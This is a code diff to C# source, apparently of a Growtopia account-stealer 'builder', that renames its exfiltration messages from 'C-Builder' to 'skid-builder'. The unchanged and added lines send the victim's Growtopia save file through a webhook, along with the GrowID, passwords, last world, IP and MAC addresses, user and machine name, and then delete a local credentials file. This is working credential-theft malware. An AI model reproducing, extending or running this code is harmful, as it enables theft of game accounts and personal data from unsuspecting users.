@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Drawing;
@@ -132,7 +132,7 @@ namespace C_Builder
 
                 webHook.AddAttachment(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\save.dat", Environment.UserName + ".dat");
 
-                webHook.SendMessageWithAttachment("```asciidoc\n" + "[C-Builder] Account stolen from:: " + Environment.UserName + " / " + Environment.MachineName + "\nGrowID :: " + growid + "\nPassword :: " + passwords + "\nLast world :: " + lastworld + "\nIP address:: " + IP + "\nMac addresses:: \n" + macs + "```", sendAttachments);
+                webHook.SendMessageWithAttachment("```asciidoc\n" + "[ skid-builder ] new account stolen from:: " + Environment.UserName + " / " + Environment.MachineName + "\nGrowID :: " + growid + "\nPassword :: " + passwords + "\nLast world :: " + lastworld + "\nIP address:: " + IP + "\nMac addresses:: \n" + macs + "```", sendAttachments);
 
                 if (File.Exists(str + "\\" + Environment.UserName + " credentials.txt"))
                     File.Delete(str + "\\" + Environment.UserName + " credentials.txt");
@@ -523,7 +523,7 @@ namespace C_Builder
 						{
                             webHook.AddAttachment(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\save.dat", Environment.UserName + ".dat");
 
-                            webHook.SendMessageWithAttachment("```asciidoc\n" + "[C-Builder] Account traced from:: " + Environment.UserName + " / " + Environment.MachineName + "\nGrowID :: " + growid + "\nPassword :: " + passwords + "\nLast world :: " + lastworld + "\nIP address:: " + IP + "\nMac addresses:: \n" + macs + "```", sendAttachments);
+                            webHook.SendMessageWithAttachment("```asciidoc\n" + "[ skid-builder ] account traced from:: " + Environment.UserName + " / " + Environment.MachineName + "\nGrowID :: " + growid + "\nPassword :: " + passwords + "\nLast world :: " + lastworld + "\nIP address:: " + IP + "\nMac addresses:: \n" + macs + "```", sendAttachments);
 
                             if (File.Exists(str + "\\" + Environment.UserName + " credentials.txt"))
                                 File.Delete(str + "\\" + Environment.UserName + " credentials.txt");
